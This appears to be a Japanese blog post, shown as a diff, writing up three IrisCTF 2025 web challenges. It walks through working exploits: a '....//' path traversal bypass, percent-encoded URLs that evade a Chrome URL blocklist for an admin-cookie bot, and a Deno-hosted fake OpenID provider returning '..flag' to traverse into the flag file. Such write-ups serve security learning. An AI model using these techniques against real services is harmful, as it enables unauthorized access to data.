@@ -1,0 +1,141 @@
+---
+title: IrisCTF 2025 writeup (Web)
+---
+
+日本時間の2025年1月4日9:00から2日間開催された[IrisCTF](https://irisc.tf/)に[traP](https://trap.jp/)として参加し、1064チーム中89位を獲得した。僕はWebの問題を3問解いたので、それについて振り返る。
+
+## Password Manager (baby)
+
+ディレクトリトラバーサルを防ぐために`PathReplacer`なるものが用意されている。
+
+```go
+var PathReplacer = strings.NewReplacer(
+	"../", "",
+)
+```
+
+が、別に置換後の文字列はチェックされないので`....//`を使えばいい。
+
+![password-manager-web.chal.irisc.tf/...//users.jsonにアクセスし、パスワードを入手した様子](/img/password-manager.avif)
+
+あとは入手したパスワードを使ってログインすればflagが表示される。
+
+## Political (easy)
+
+index.htmlとchal.pyを眺めると、
+
+- アクセスするごとにランダムなトークンが発行される
+- `valid_tokens[token] == True`となるトークンを使うとflagを入手できる
+- `valid_tokens`を設定するにはadminのcookieが必要
+
+ということが分かる。また、配布ファイルの`bot/`ディレクトリには`nc`先で動いているものと思われるコードがある。bot.jsはadminのcookieを使って与えられたURLにアクセスしてくれるので、こいつに`https://political-web.chal.irisc.tf/giveflag?token=TOKEN`を渡せば良さそうだ。しかし、policy.jsonがあるのでそのままではうまくいかない。
+
+```json
+{
+	"URLBlocklist": ["*/giveflag", "*?token=*"]
+}
+```
+
+Dockerfileに次のような行
+
+```Dockerfile
+COPY policy.json /etc/opt/chrome_for_testing/policies/managed/
+```
+
+があるので、policy.jsonはChromeの設定ファイルらしい。というわけで[Chromeのドキュメント](https://support.google.com/chrome/a/answer/9942583?hl=JA)を読むと、パスとクエリパラメータでは大文字・小文字が区別されると書いてある。これが使えないかと思ったが、Flaskがデフォルトでcase-sensitiveなので駄目だった。他に`URLBlocklist`にはマッチさせず同じURLを表現する方法を考えたところ、パーセントエンコードすれば良いということに気付いたため`https://political-web.chal.irisc.tf/%67iveflag?%74oken=TOKEN`をbot.jsに渡して解決した。こんなんで回避できちゃうポリシーに意味あるのかな。
+
+## Bad Todo (medium)
+
+OpenIDとか書いてあるが、よく分からないので一旦置いておく。prime_flag.jsに
+
+```javascript
+const client = createClient({
+    url: `file://${process.env.STORAGE_LOCATION}/flag`
+});
+```
+
+とあり、他に`createClient`が呼ばれている箇所では全て
+
+```javascript
+const client = createClient({
+    url: `file://${getStoragePath(idp, sub)}`
+});
+```
+
+となっているので`getStoragePath`に適当な引数を渡すことでflagを取得できないか考える。
+
+```javascript
+export function sanitizePath(base) {
+    const normalized = path.normalize(path.join(process.env.STORAGE_LOCATION, base));
+    const relative = path.relative(process.env.STORAGE_LOCATION, normalized);
+    if (relative.includes("..")) throw new Error("Path insane");
+
+    const parent = path.dirname(normalized);
+    mkdirSync(parent, { recursive: true });
+    
+    return normalized;
+}
+
+export function getStoragePath(idp, sub) {
+    const first2 = sub.substring(0, 2);
+    const rest = sub.substring(2);
+
+    const path = `${sha256sum(idp)}/${encodeURIComponent(first2)}/${encodeURIComponent(rest)}`;
+    return sanitizePath(path);
+}
+```
+
+`sanitizePath`に`relative.includes("..")`とあるので一見`..`を含めることができなそうだが、ここでチェックされているのは`STORAGE_LOCATION`に対する相対パスなので遡りすぎなければ問題ない。`encodeURIComponent`のせいで自由に`/`を使うことはできないが、なぜか`sub`の最初2文字を切り出してくれているので`..flag`とすることで`path`が`${sha256sum(idp)}/../flag`になる。
+
+では`sub`は何なのか？関数の呼び出し元を辿っていくと、フォームに入力したOpenIDのissuerが返す値が使われていることが分かる。なのであとは適当なOpenIDプロバイダを用意して`..flag`を返すようにするだけだ。ここでOpenIDに関する知識は必要なくて（僕は持っていない）、ただapp.jsで使われているレスポンスを返すだけのサーバを用意すれば良い。
+
+```typescript
+const issuer = "https://close-badger-22.deno.dev"
+
+Deno.serve((req) => {
+  const reqUrl = new URL(req.url)
+
+  if (reqUrl.pathname === "/.well-known/openid-configuration") {
+    return Response.json({
+      issuer: issuer,
+      authorization_endpoint: issuer + "/auth",
+      token_endpoint: issuer + "/token",
+      userinfo_endpoint: issuer + "/userinfo",
+    })
+  }
+
+  if (reqUrl.pathname === "/auth") {
+    const redirectUri = reqUrl.searchParams.get("redirect_uri")
+    const state = reqUrl.searchParams.get("state")
+
+    if (!redirectUri) {
+      return new Response("redirect_uri is required", { status: 400 })
+    }
+
+    return Response.redirect(redirectUri + "?state=" + state)
+  }
+
+  if (reqUrl.pathname === "/token") {
+    return Response.json({
+      access_token: "token",
+      token_type: "Bearer",
+    })
+  }
+
+  if (reqUrl.pathname === "/userinfo") {
+    return Response.json({
+      sub: "..flag",
+    })
+  }
+
+  return new Response("Not Found", { status: 404 })
+})
+```
+
+初めてDeno Deployを使ってみたが、リポジトリを用意したりしなくてもplaygroundでサクッとサーバーを立てられるのは便利だった。
+
+![Deno Deployのplayground](/img/deno-deploy-playground.avif)
+
+## おわりに
+
+CTFのWeb問にしっかり時間を割くのは初めてだったが、思ったより解けて楽しかった。去年はtraPのCTF班に所属しておきながら講習会を受けるだけでほとんどコンテストに出られていなかったので、今年はもっと活動していきたい。
